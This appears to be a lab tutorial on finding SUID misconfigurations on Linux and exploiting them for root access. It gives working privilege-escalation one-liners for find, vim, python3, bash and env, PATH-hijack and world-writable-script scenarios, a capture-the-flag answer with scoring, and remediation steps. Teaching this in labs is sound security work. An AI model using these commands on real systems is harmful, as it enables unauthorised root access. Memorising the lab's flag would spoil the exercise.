---
name: detecting-suid-misconfigurations-for-privesc
description: >-
  Identify SUID (Set User ID) binary misconfigurations on Linux systems that allow
  unprivileged users to escalate to root. Covers manual enumeration, GTFOBins
  technique lookup, and exploitation in isolated lab environments. Essential skill
  for Linux privilege escalation during penetration testing engagements.
domain: cybersecurity
subdomain: privilege-escalation
tags: [suid, privilege-escalation, linux, privesc, intermediate, gtfobins]
difficulty: intermediate
mitre_techniques: [T1548.001]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/privilege-escalation/suid-lab
---

> ⚠️ **Educational Use Only** — Privilege escalation techniques must only be practiced in isolated lab environments or authorized penetration testing engagements. Using these techniques on unauthorized systems constitutes unauthorized computer access, which is a criminal offense.

## When to Use

- After gaining initial foothold on a Linux target during an authorized penetration test, during the privilege escalation phase
- In CTF challenges requiring root access to read `/root/flag.txt`
- When learning Linux security internals (file permissions, special permission bits)
- When auditing a Linux system for insecure SUID configurations as part of a security assessment
- As a prerequisite for understanding capabilities, sudo misconfigurations, and cron-based privesc

## Prerequisites

- **Software:** Docker + Docker Compose (lab environment)
- **Knowledge:** Basic Linux command line (ls, find, chmod, understanding of users/groups), what root means
- **Lab:** `labs/privilege-escalation/suid-lab` — start with `agentlab start suid-lab`
- **Difficulty:** Intermediate — basic Linux familiarity required
- **Time:** 30–50 minutes

## Workflow

### Step 1: Start the Lab

```bash
agentlab start suid-lab
agentlab exec suid-lab bash
# You start as: www-data (low-privilege user)
# Goal: escalate to root and read /root/flag.txt
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 2: Find SUID Binaries

SUID binaries run with the file owner's permissions (often root) regardless of who executes them:

```bash
# Find all SUID binaries on the system
find / -perm -u=s -type f 2>/dev/null

# Alternative syntax
find / -perm /4000 -type f 2>/dev/null
```

Record the output. Compare against the expected list of legitimate SUID binaries.

### Step 3: Identify Unusual SUID Binaries

**Expected/legitimate SUID binaries** (almost always present, low risk):
```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/bin/ping
/usr/bin/mount
```

**Suspicious SUID binaries** — flag any of these for GTFOBins lookup:
```
/usr/bin/find
/usr/bin/vim
/usr/bin/python3
/usr/bin/bash
/usr/bin/nmap (old versions)
/usr/bin/less
/usr/bin/more
/usr/bin/awk
/usr/bin/env
/usr/bin/cp
/usr/bin/wget
```

### Step 4: Look Up Exploitation Technique via GTFOBins

GTFOBins documents how to exploit legitimate Unix binaries for privilege escalation. For each suspicious SUID binary found, the technique follows a pattern:

**Example: SUID `find`**
```bash
# If /usr/bin/find has SUID bit set:
/usr/bin/find . -exec /bin/sh -p \; -quit
# -p flag: preserves effective UID (root)
```

**Example: SUID `vim`**
```bash
/usr/bin/vim -c ':!/bin/sh -p'
```

**Example: SUID `python3`**
```bash
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Example: SUID `bash`**
```bash
/bin/bash -p
# -p: runs in privileged mode, preserves effective UID
```

**Example: SUID `env`**
```bash
/usr/bin/env /bin/sh -p
```

### Step 5: Verify Escalation

After executing the exploitation technique:

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
# root (or euid=0 visible)
```

### Step 6: Capture the Flag

```bash
cat /root/flag.txt
# FLAG{suid_privesc_complete}
```

Submit via `agentlab verify suid-lab "FLAG{suid_privesc_complete}"`.

### Step 7: Understand the Fix

After capturing the flag, examine why the SUID was misconfigured:

```bash
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root ... /usr/bin/find
#  ^^^ s = SUID bit
```

**Remediation:** Remove the SUID bit from any binary that doesn't need it:
```bash
chmod u-s /usr/bin/find
```

Principle: SUID should only be set on binaries that explicitly require elevated privileges to function correctly (e.g., `passwd` needs to write to `/etc/shadow`).

## Key Concepts

| Concept | Definition |
|---------|-----------|
| SUID | Set User ID — special permission bit that makes a file execute with the owner's UID instead of the invoker's |
| Effective UID (euid) | The UID used for permission checks during execution — SUID makes euid = file owner |
| GTFOBins | Database of Unix binaries that can be abused when given elevated privileges (gtfobins.github.io) |
| `-p` flag (bash/sh) | Preserves the effective UID, preventing bash from dropping privileges when invoked with SUID |
| T1548.001 | MITRE ATT&CK: Abuse Elevation Control Mechanism — Setuid and Setgid |
| Least Privilege | Security principle: every binary, process, and user should have only the minimum permissions needed |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `find` | Enumerate SUID/SGID binaries | ✅ Pre-installed |
| GTFOBins | Online reference for privilege escalation via common binaries | ✅ Referenced in hints |
| LinPEAS | Automated Linux privilege escalation enumeration script | ✅ Pre-installed in lab |
| `ls -la` | Check file permissions and SUID bit | ✅ Built-in |

## Common Scenarios

### Scenario 1: SUID Python — Immediate Root

```bash
find / -perm -u=s -name "python*" 2>/dev/null
# /usr/bin/python3.9

/usr/bin/python3.9 -c 'import os; os.execl("/bin/sh","sh","-p")'
# $ id → euid=0(root)
```

### Scenario 2: Custom SUID Binary with Path Injection

A custom SUID binary `/usr/local/bin/backup` calls `tar` without an absolute path:

```bash
# The binary internally runs: tar -czf backup.tar.gz /var/www/
# We can hijack 'tar' by prepending our path:
echo '/bin/sh -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup
# → root shell
```

### Scenario 3: SUID + World-Writable Script

A SUID binary `/usr/local/bin/monitor` sources `/opt/monitor.sh` (world-writable):

```bash
echo '/bin/sh -p' >> /opt/monitor.sh
/usr/local/bin/monitor
# → root shell
```

## Output / Verification

```bash
agentlab verify suid-lab "FLAG{suid_privesc_complete}"
```

**Score:** 150 points for root flag + 50 bonus for using manual enumeration without LinPEAS

## Further Reading

- [GTFOBins](https://gtfobins.github.io/) — essential reference for SUID exploitation
- MITRE ATT&CK: [T1548.001 — Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/)
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings: Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
